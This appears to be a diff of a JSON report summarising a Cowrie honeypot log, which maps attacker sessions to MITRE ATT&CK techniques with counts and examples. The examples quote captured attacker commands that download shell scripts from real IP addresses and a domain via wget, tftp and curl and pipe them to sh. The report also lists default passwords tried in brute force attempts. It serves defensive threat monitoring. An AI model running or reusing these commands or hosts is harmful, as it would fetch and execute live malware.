@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-10 04:03:44",
+  "generated": "2026-09-10 05:03:11",
   "totals": {
-    "commands": 515,
-    "login_failed": 438,
-    "login_success": 177,
-    "sessions": 500
+    "commands": 525,
+    "login_failed": 479,
+    "login_success": 182,
+    "sessions": 542
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 438,
+      "count": 479,
       "examples": [
         "root / xc3511",
         "root / 54321",
@@ -21,14 +21,14 @@
         "root / root"
       ],
       "first": "2026-09-10T00:00:10.861058Z",
-      "last": "2026-09-10T04:03:40.958781Z",
-      "unique_ips": 63
+      "last": "2026-09-10T05:01:37.287771Z",
+      "unique_ips": 73
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 177,
+      "count": 182,
       "examples": [
         "enable\\x00 / linuxshell\\x00",
         "enable\\x00 / system\\x00",
@@ -37,14 +37,14 @@
         "nobody / password"
       ],
       "first": "2026-09-10T00:00:11.554236Z",
-      "last": "2026-09-10T04:00:37.483868Z",
-      "unique_ips": 23
+      "last": "2026-09-10T04:50:59.271075Z",
+      "unique_ips": 28
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 20,
+      "count": 21,
       "examples": [
         "cd /tmp||cd /var/run||cd /mnt||cd /root||cd /;(wget -q -O 1.sh http://198.144.179.82:80/1.sh||busybox wget -q -O 1.sh ht",
         "/bin/busybox wget http://45.150.195.235/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 45.150.195.235 -g -r tftp.sh ",
@@ -53,14 +53,14 @@
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C\nuname=$(for c in unam"
       ],
       "first": "2026-09-10T00:41:47.834125Z",
-      "last": "2026-09-10T03:51:24.241546Z",
-      "unique_ips": 5
+      "last": "2026-09-10T04:51:00.009130Z",
+      "unique_ips": 6
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 10,
+      "count": 11,
       "examples": [
         "cd /tmp||cd /var/run||cd /mnt||cd /root||cd /;(wget -q -O 1.sh http://198.144.179.82:80/1.sh||busybox wget -q -O 1.sh ht",
         "/bin/busybox wget http://45.150.195.235/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 45.150.195.235 -g -r tftp.sh ",
@@ -69,8 +69,8 @@
         "mkdir -p /usr/lib/.sysd-scan/tmhome && curl -sL -o /tmp/tm.sh https://del.sou.pp.ua/install_tm.sh && cd /usr/lib/.sysd-s"
       ],
       "first": "2026-09-10T00:41:47.834125Z",
-      "last": "2026-09-10T03:51:24.241546Z",
-      "unique_ips": 4
+      "last": "2026-09-10T04:51:00.009130Z",
+      "unique_ips": 5
     },
     {
       "id": "T1082",
@@ -177,22 +177,38 @@
   "unmapped": [
     [
       "shell",
-      157
+      158
     ],
     [
       "sh",
-      157
+      158
     ],
     [
       "system",
-      155
+      156
     ],
     [
       "/bin/busybox",
-      7
+      8
     ],
     [
       "enable",
+      3
+    ],
+    [
+      "ping; sh",
+      2
+    ],
+    [
+      "/bin/busybox STC",
+      2
+    ],
+    [
+      "/bin/busybox hostname TOASTER",
+      2
+    ],
+    [
+      "cd /proc && cat self/cmdline",
       2
     ],
     [
@@ -201,18 +217,6 @@
     ],
     [
       "/bin/busybox TOKEN",
-      1
-    ],
-    [
-      "ping; sh",
-      1
-    ],
-    [
-      "/bin/busybox STC",
-      1
-    ],
-    [
-      "/bin/busybox hostname TOASTER",
       1
     ],
     [
@@ -245,10 +249,6 @@
     ],
     [
       "busybox",
-      1
-    ],
-    [
-      "cd /proc && cat self/cmdline",
       1
     ]
   ]
